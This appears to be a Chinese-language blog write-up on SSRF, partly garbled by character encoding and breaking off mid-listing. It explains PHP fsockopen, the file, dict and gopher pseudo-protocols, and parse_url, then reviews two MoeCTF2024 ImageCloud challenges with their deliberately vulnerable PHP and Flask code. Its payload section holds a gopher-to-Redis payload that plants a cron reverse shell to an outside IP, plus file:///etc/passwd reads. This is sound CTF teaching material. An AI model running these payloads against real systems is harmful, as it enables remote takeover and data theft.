<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fsockopen</span>() <span class="comment">// æ‰“å¼€ Internet æˆ–è€… Unix å¥—æ¥å­— é“¾æ¥</span></span><br><span class="line"></span><br><span class="line">resource|<span class="literal">false</span> <span class="title function_ invoke__">fsockopen</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$hostname</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$error_code</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">string</span> &amp;<span class="variable">$error_message</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">float</span> <span class="variable">$timeout</span> = <span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;default_socket_timeout&quot;</span>)</span><br><span class="line">)</span><br><span class="line">ä¾‹ï¼š<span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;www.example.com&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>ç±»å‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>$hostname</code></td>
<td>string</td>
<td>ä¸»æœºåæˆ– IP åœ°å€ã€‚æ”¯æŒåè®®å‰ç¼€å¦‚ <code>ssl://</code>ã€<code>tls://</code> ç­‰</td>
</tr>
<tr>
<td><code>$port</code></td>
<td>int</td>
<td>ç«¯å£å·</td>
</tr>
<tr>
<td><code>$error_code</code></td>
<td>int å¼•ç”¨</td>
<td>è‹¥è¿æ¥å¤±è´¥ï¼Œæ­¤å˜é‡å°†å­˜å‚¨é”™è¯¯ä»£ç </td>
</tr>
<tr>
<td><code>$error_message</code></td>
<td>string å¼•ç”¨</td>
<td>è‹¥è¿æ¥å¤±è´¥ï¼Œæ­¤å˜é‡å°†å­˜å‚¨é”™è¯¯ä¿¡æ¯</td>
</tr>
<tr>
<td><code>$timeout</code></td>
<td>float</td>
<td>è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’</td>
</tr>
</tbody></table>
<h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><h4 id="file-ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰"><a href="#file-ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰" class="headerlink" title="file:&#x2F;&#x2F;ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰"></a>file:&#x2F;&#x2F;ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>password  <span class="comment"># file:// ä¹‹åå¯ä»¥æ¥ä»»æ„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h4 id="dict-ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰"><a href="#dict-ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰" class="headerlink" title="dict:&#x2F;&#x2F;ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰"></a>dict:&#x2F;&#x2F;ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰</h4><p><code>dict://ip/info</code>å¯è·å–æœ¬åœ°<code>redis</code>æœåŠ¡é…ç½®ä¿¡æ¯ã€‚</p>
<p>å¯ä»¥ç”¨æ¥æµ‹è¯•å’Œå†™å…¥webshellã€‚</p>
<h4 id="ftp-ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰"><a href="#ftp-ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰" class="headerlink" title="ftp:&#x2F;&#x2F;ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰"></a>ftp:&#x2F;&#x2F;ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰</h4><h4 id="data-ï¼ˆåµŒå…¥æ•°æ®ï¼‰"><a href="#data-ï¼ˆåµŒå…¥æ•°æ®ï¼‰" class="headerlink" title="data:&#x2F;&#x2F;ï¼ˆåµŒå…¥æ•°æ®ï¼‰"></a>data:&#x2F;&#x2F;ï¼ˆåµŒå…¥æ•°æ®ï¼‰</h4><p>ä¾‹å¦‚ç›´æ¥åµŒå¥—ä¸€ä¸ªBase64åŠ å¯†çš„ç…§ç‰‡ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/png;base64,0KGgoAAAAFGUIknuNSUhEUg...YGGjnm=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4><p>å¸¸ç”¨äºåå¼¹shell</p>
<h3 id="Parse-urlå‡½æ•°"><a href="#Parse-urlå‡½æ•°" class="headerlink" title="Parse_urlå‡½æ•°"></a>Parse_urlå‡½æ•°</h3><p>è¿™é‡Œå•ç‹¬æä¸€ä¸‹Parse_urlè¿™ä¸ªå‡½æ•°,ç”¨äºæ‹†åˆ†urlçš„å„ä¸ªéƒ¨åˆ†ä¸ºä¸€ä¸ªç±»ä¼¼å­—å…¸çš„ä¸œè¥¿ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ç»“æœ----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//@å</span><br><span class="line">    [user] =&gt; username			//@å‰</span><br><span class="line">    [pass] =&gt; password			//@å‰</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?ä»¥åçš„key=value</span><br><span class="line">    [fragment] =&gt; anchor		#ä»¥åçš„éƒ¨åˆ†</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://ctf.@127.0.0.1/flag.php?show&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿è¡Œç»“æœ:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;ctf.&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;show&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å¸¸ç”¨Payload"><a href="#å¸¸ç”¨Payload" class="headerlink" title="å¸¸ç”¨Payload"></a>å¸¸ç”¨Payload</h3><p>ä»¥curlä¸ºä¾‹, å¯ä»¥ä½¿ç”¨dictåè®®æ“ä½œRedisã€fileåè®®è¯»æ–‡ä»¶ã€gopheråè®®åå¼¹Shellç­‰åŠŸèƒ½ï¼Œå¸¸è§çš„Payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -vvv &#x27;dict://<span class="number">127.0.0.1:6379</span>/info&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line"><span class="comment"># * æ³¨æ„: é“¾æ¥ä½¿ç”¨å•å¼•å·ï¼Œé¿å…$å˜é‡é—®é¢˜</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;gopher://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">103.21.140.84</span>/<span class="number">6789</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡urlè§£ç ä¾¿æ˜¯ï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span> $<span class="number">8</span> flushall *<span class="number">3</span> $<span class="number">3</span> set $<span class="number">1</span> <span class="number">1</span> $<span class="number">64</span> */<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">3</span> dir $<span class="number">16</span> /var/www/html/ *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">10</span> dbfilename $<span class="number">4</span> root *<span class="number">1</span> $<span class="number">4</span> save quit</span><br></pre></td></tr></table></figure>

<h2 id="é¢˜ç›®å›é¡¾"><a href="#é¢˜ç›®å›é¡¾" class="headerlink" title="é¢˜ç›®å›é¡¾"></a>é¢˜ç›®å›é¡¾</h2><p>å›é¡¾ä¸€ä¸‹MoeCTF2024ä¸­çš„ä¸¤é“SSRFé¢˜ç›®å§ï¼š</p>
<h3 id="ImageCloudå‰ç½®"><a href="#ImageCloudå‰ç½®" class="headerlink" title="ImageCloudå‰ç½®"></a><strong>ImageCloudå‰ç½®</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = <span class="title function_ invoke__">getimagesizefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æ—¶å¹¶ä¸èƒ½çœ‹æ‡‚ï¼Œç°åœ¨å°±èƒ½æœ‰äº›è®¤çŸ¥äº†ã€‚çœ‹åˆ°<code>curl_exec</code>ã€<code>curl_init</code>ä¹‹ç±»å¾ˆæ˜æ˜¾çš„SSRFç‰¹å¾ã€‚</p>
<p>é¢˜ç›®æç¤ºflagåœ¨&#x2F;etc&#x2F;passwdé‡Œï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥åˆ©ç”¨fileä¼ªåè®®è¯»å–flagæ–‡ä»¶å³å¯ï¼š<br><code>payload: file:///etc/passwd</code>ã€‚</p>
<h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a><strong>ImageCloud</strong></h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;å›¾ç‰‡ä¸Šä¼ &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;å·²ä¸Šä¼ çš„å›¾ç‰‡&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">        <span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image?url=http://localhost:5000/static/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files</span><br><span class="line">    ) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æœªæ‰¾åˆ°æ–‡ä»¶éƒ¨åˆ†&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æœªé€‰æ‹©æ–‡ä»¶&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ”¯æŒ&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL å‚æ•°ç¼ºå¤±&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        img = Image.<span class="built_in">open</span>(BytesIO(response.content))</span><br><span class="line"></span><br><span class="line">        img_io = BytesIO()</span><br><span class="line">        img.save(img_io, img.<span class="built_in">format</span>)</span><br><span class="line">        img_io.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> send_file(img_io, mimetype=img.get_format_mimetype())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;æ— æ³•åŠ è½½å›¾ç‰‡: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>app2.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 